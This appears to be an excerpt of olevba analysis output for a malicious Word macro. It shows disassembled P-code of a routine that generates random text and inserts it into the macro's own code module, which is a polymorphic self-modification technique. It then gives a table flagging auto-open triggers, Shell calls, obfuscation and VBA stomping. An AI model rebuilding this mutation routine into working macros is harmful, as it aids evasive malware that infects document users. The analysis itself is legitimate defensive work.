' 	ArgsLd Rnd 0x0000 
' 	Ld Number 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St RandomLine 
' Line #182:
' 	ArgsLd Rnd 0x0000 
' 	LitDI2 0x0028 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St rl 
' Line #183:
' 	StartForVariable 
' 	Ld cl 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld rl 
' 	For 
' Line #184:
' 	Ld rb 
' 	LitDI2 0x005A 
' 	LitDI2 0x0041 
' 	Sub 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	Ld Rnd 
' 	Mul 
' 	LitDI2 0x0041 
' 	Add 
' 	FnInt 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St rb 
' Line #185:
' 	StartForVariable 
' 	Ld cl 
' 	EndForVariable 
' 	NextVar 
' Line #186:
' Line #187:
' 	LitStr 0x0005 "frodo"
' 	Ld Current 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0000 
' Line #188:
' 	ParamOmitted 
' 	Ld vbTab 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld rb 
' 	Concat 
' 	ArgsCall RandomLine 0x0002 
' Line #189:
' 	LitStr 0x0000 ""
' 	St rb 
' Line #190:
' 	StartForVariable 
' 	Ld ploop 
' 	EndForVariable 
' 	NextVar 
' Line #191:
' 	EndSub 
' Line #192:
' Line #193:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |autoexec.bat        |Executable file name                         |
|IOC       |Application.VBE     |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

